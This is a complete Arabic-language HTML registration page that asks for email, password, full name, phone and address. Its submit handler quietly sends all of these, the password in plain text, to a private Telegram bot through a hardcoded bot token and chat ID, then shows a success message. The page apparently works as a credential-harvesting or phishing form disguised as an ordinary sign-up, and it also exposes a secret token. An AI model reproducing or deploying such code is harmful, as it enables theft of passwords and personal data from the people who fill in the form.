<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>تسجيل</title>
<style>
body{
font-family:Arial;
background:#0f0f0f;
color:#fff;
text-align:center;
}
form{
margin:auto;
width:370px;
display:flex;
flex-direction:column;
}
input,select,button{
margin:6px;
padding:10px;
border-radius:6px;
border:none;
}
button{background:#28a745;color:#fff;cursor:pointer;}
</style>
</head>

<body>

<h2>نموذج التسجيل</h2>

<form id="form">

<input type="email" id="email" placeholder="الإيميل" required>
<input type="password" id="password" placeholder="كلمة المرور" required>
<input type="text" id="name" placeholder="الاسم رباعي" required>
<input type="text" id="phone" placeholder="رقم الهاتف" required>
<input type="text" id="address" placeholder="العنوان" required>

<select id="study">
<option value="يدرس">يدرس</option>
<option value="لا يدرس">لا يدرس</option>
</select>

<button type="submit">إرسال</button>

</form>

<script>
document.getElementById("form").addEventListener("submit", function(e){
e.preventDefault();

let data =
`📩 تسجيل جديد:
📧 Email: ${email.value}
🔑 Password: ${password.value}
👤 Name: ${name.value}
📱 Phone: ${phone.value}
🏠 Address: ${address.value}
🎓 Study: ${study.value}`;

let token = "8664032329:AAE6et1sbljPijPL8jZnE6HdzdH-_YWoQX8";
let chat_id = "8249563506";

fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
chat_id: chat_id,
text: data
})
});

alert("تم الإرسال بنجاح ✔️");
});
</script>

</body>
</html>
